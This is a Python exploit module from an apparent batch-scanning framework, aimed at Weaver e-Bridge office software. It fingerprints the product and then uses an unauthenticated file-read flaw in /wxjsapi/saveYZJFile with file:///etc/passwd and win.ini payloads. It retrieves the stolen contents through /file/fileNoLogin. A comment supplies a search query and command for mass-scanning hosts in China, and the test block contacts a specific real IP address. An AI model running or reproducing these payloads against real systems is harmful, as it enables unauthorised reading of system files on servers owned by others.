# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 18:33

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# title="泛微云桥 e-Bridge" && country="CN"
# python3 batch.py -m exploit.scripts.OA.Weaver.E-Bridge.unauth_readfile -cs -fs "title=\"泛微云桥 e-Bridge\" && country=\"CN\""

class Script(BaseScript):
    name = 'E-Bridge'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.READFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt',
                               '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt']
        # 相关信息
        self.info = '2018-2019 多个版本'

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if '<meta name="searchtitle" content="泛微云桥e-Bridge">' in text or 'e-Bridge' in text or 'wx.weaver' in text or 'content="泛微云桥e-bridge"' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                ret_json = await AsyncFetcher.fetch(session=session, url=url, timeout=self.req_timeout, headers=self.headers, json=True)
                if not isinstance(ret_json, str) and ret_json.get('id', ''):
                    content_id = ret_json.get('id')
                    url2 = f'http://{self.target}/file/fileNoLogin/{content_id}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/file/fileNoLogin/{content_id}'
                    text2 = await AsyncFetcher.fetch(session=session, url=url2, headers=self.headers, timeout=self.req_timeout)
                    if 'root:x' in text2 or 'extensions' in text2:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url2))
                        return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url2, 'software': self.name}


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('http://39.106.156.61:8088/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)